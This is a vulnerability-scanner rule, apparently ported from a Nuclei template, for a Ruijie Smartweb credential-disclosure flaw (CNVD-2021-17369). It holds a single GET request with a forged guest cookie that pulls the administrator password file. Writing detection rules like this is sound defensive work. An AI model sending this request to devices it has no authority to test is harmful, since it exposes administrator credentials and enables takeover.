schema_version: 1
id: "cortex.community:cnvd-2021-17369"
rule_version: "1.0.0"
requires:
  engine_api: 1
  capabilities: ["http.standard.v1", "matchers.basic.v1", "proof.signal.v1"]
info:
  name: "Ruijie Smartweb Management System Password Information Disclosure"
  description: "The wireless smartweb management system of Ruijie Networks Co., Ltd. has a logic flaw. An attacker can obtain the administrator account and password from a low-privileged user, thereby escalating the low-level privilege to the administrator's privilege. Auto-ported from a Nuclei template by nuclei2cdl. Certainty is LIKELY: a ported matcher has no baseline/differential proof, so it is a signal, not a confirmed exploit. Review before use."
  references:
    - "https://www.cnvd.org.cn/flaw/show/CNVD-2021-17369"
  cwes: [522]
  tags: ["cnvd2021", "cnvd", "ruijie", "disclosure", "vuln", "nuclei", "auto-ported", "signal"]
  remediation: "See the referenced advisory / template source for remediation."
finding:
  sink_type: "VULNERABLE_COMPONENT"
  impact: "INFORMATION_DISCLOSURE"
  severity: "High"
  root_cause: "nuclei-ported-signal"
execution: { auth: "anonymous", side_effects: "read_only", transport: "http" }
steps:
  - id: "probe0"
    request:
      method: "GET"
      path: "/web/xml/webuser-auth.xml"
      headers: { "Cookie": "login=1; auth=Z3Vlc3Q6Z3Vlc3Q%3D; user=guest" }
proof:
  kind: "signal.v1"
  assertions:
    all:
      - all:
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<userauth>" } }
          - contains: { left: { ref: "steps.probe0.body" }, right: { value: "<password>" } }
      - eq: { left: { ref: "steps.probe0.status" }, right: { value: 200 } }
